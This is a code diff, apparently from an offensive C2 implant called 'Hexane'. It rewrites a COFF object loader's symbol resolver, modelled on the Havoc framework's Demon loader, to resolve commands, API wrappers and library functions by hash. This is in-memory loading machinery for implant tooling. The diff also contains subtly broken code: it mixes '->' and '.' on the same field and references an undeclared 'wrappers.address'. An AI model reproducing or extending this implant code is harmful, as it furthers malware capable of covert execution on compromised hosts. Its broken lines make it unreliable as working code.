@@ -10,34 +10,52 @@ namespace Objects {
         return EXCEPTION_CONTINUE_EXECUTION;
     }
 
-    BOOL ResolveSymbol(_executable* object, const char* symbol_name, uint32_t type, void** function) {
+    BOOL ResolveSymbol(_executable* object, uint8_t* symbol_name, void** function) {
         // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/CoffeeLdr.c
         HEXANE
 
         uint32_t    type    = 0;
-        uint32_t    hash    = { };
-        const char  *cmp    = { };
-
-        const auto  sym     = COFF_PREP_SYMBOL;
-        const auto  beacon  = COFF_PREP_BEACON;
+        uint32_t    func    = 0;
+        uint32_t    lib     = 0;
         bool        success = true;
 
-        //__impl_
-        if (x_memcmp(symbol_name, &sym, COFF_PREP_SYMBOL_SIZE) != 0) {
-            goto defer;
-        }
 
-        uint32_t length = x_strlen(symbol_name);
+        x_memcpy(&type, symbol_name, sizeof(uint32_t));
+        x_memcpy(&func, symbol_name + sizeof(uint32_t), sizeof(uint32_t));
 
-        for (auto i = COFF_PREP_SYMBOL_SIZE + 1; i < length - 1; ++i) {
-            if (x_memcmp(&symbol_name[i], &beacon, COFF_PREP_BEACON_SIZE) == 0) {
-                // __impl_Hexane
+        if (type == COFF_HEXANE_HASH) {
+            for (auto i = 0;; i++) {
 
-            } else if (symbol_name[i] == '$') {
-                // __impl_LIBNAME$FUNCNAME
-            } else {
-                // __impl_FUNCNAME
+                if (!cmd_map[i].name) {
+                    success_(false);
+                }
+
+                if (cmd_map[i].name == func) {
+                    *function = (void*)cmd_map[i].address;
+                    success_(true);
+                }
             }
+        } else if (type == COFF_IMPL_HASH) {
+            for (auto i = 0;; i++) {
+
+                if (!Ctx->wrappers->name[i]) {
+                    success_(false);
+                }
+
+                if (Ctx->wrappers.name[i] == func) {
+                    *function = (void*)wrappers.address[i];
+                    success_(true);
+                }
+            }
+        } else if (type == COFF_INCL_HASH) {
+            x_memcpy(&lib, symbol_name + (sizeof(uint32_t) * 2), sizeof(uint32_t));
+            V_PTR_HASHES(*function, lib, func);
+
+            if (!*function) {
+                success_(false);
+            }
+        } else {
+            success_(false);
         }
 
         defer:
